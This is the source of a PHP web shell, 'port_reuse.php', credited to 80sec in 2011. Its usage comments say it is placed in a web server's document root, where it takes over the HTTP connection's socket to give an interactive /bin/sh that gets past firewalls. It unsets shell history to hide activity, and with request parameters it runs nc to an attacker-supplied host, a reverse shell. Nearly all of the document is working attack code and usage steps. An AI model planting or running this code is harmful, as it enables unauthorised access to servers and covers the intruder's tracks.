<?php
// 
//  port_reuse.php
//  
//  Created by wofeiwo <wofeiwo@80sec.com> on 2011-08-27.
//  Copyright 2011 80sec. All rights reserved.
//  Reuse Apache 80 port to spawn a interactive shell. Bypass the firewall.
//  Note: Only available on PHP >= 5.3.6 and PHP < 5.4.4 with mod_php on apache.
//        PHP has limited "php://fd" in cli mod.(https://github.com/php/php-src/commit/df2a38e7f8603f51afa4c2257b3369067817d818)
//  Usage: 1. Put the script on htdocs.
//         2. Get interactive shell:
//              nc www.target 80
//              GET /port_reuse.php HTTP/1.0\r\n\r\n
//         3. Forward port:
//              ./pr.py http://www.target.com/port_reuse.php 127.0.0.1:22
//              ssh root@localhost -p 1234
// 

function find_socket(){
    // Get tcp connection status from /proc
    $net = file_get_contents("/proc/net/tcp");
    $net .= file_get_contents("/proc/net/tcp6");

    // Find fd from /proc 
    $dir = dir("/proc/self/fd");
    while (false !== ($e = $dir->read())) {
        // Find socket inode in /proc/self/fd.
        if (is_link("/proc/self/fd/".$e) && $e != "." && $e != ".."){
            if(preg_match("/socket:\[(\d+)\]/", @readlink("/proc/self/fd/".$e), $m1)){
                // Match every socket inode in /proc/net/tcp & /proc/net/tcp6. 
                // If it matchs this connection remote ip/remote port, bingo! We got it!
                if(preg_match("/.*${m1[1]}/", $net, $m2)){
                    preg_match_all("/(\w{8}):(\w{4})/", $m2[0], $m3);

                    // decode ips
                    $sipstring = $m3[1][0][6].$m3[1][0][7].$m3[1][0][4].$m3[1][0][5].$m3[1][0][2].$m3[1][0][3].$m3[1][0][0].$m3[1][0][1];
                    sscanf($sipstring, "%x", $siplong);
                    $ripstring = $m3[1][1][6].$m3[1][1][7].$m3[1][1][4].$m3[1][1][5].$m3[1][1][2].$m3[1][1][3].$m3[1][1][0].$m3[1][1][1];
                    sscanf($ripstring, "%x", $riplong);
                    $sip = long2ip($siplong);
                    $rip = long2ip($riplong);

                    // decode ports
                    sscanf($m3[2][0], "%x", $sport);
                    sscanf($m3[2][1], "%x", $rport);

                    if ($rip == $_SERVER['REMOTE_ADDR'] && $rport == $_SERVER['REMOTE_PORT']){
                        $dir->close();
                        return $e; // That is our socket fd.
                    }
                }
            }
        }
    }
    $dir->close();
    return false;
}

function spawn_shell($fd, $cmd)
{
    $fp = fopen("php://fd/".$fd, "a+");
    //stream_set_blocking($fp, false);

    $descs = array(
        0 => $fp,
        1 => $fp,
        2 => $fp
    );

    $cwd = getcwd();

    $shell = proc_open($cmd, $descs, $pipes, $cwd, $_ENV);
    if(is_resource($shell)){
        proc_close($shell);
    }else{
        die("[-] Can't fork shell process.\n");
    }
}

function main(){
    // Some env checks here.
    if (version_compare(phpversion(), '5.3.6') < 0){
        die("[-] PHP must at least version 5.3.6.\n");
    }

    if (!(isset($_REQUEST['rhost']) && isset($_REQUEST['rport']))){
        $cmd = "unset HISTFILE ; id ; uname -a ; pwd ; /bin/sh -ip";
    }
    else{
        $cmd = "nc ${_REQUEST['rhost']} ${_REQUEST['rport']}";
    }

    $fd = find_socket();

    if (!isset($fd)){
        die("[-] Can't find this socket information.\n");
    }
        
    if(isset($cmd)){
        spawn_shell($fd, $cmd);
    }
}

main();
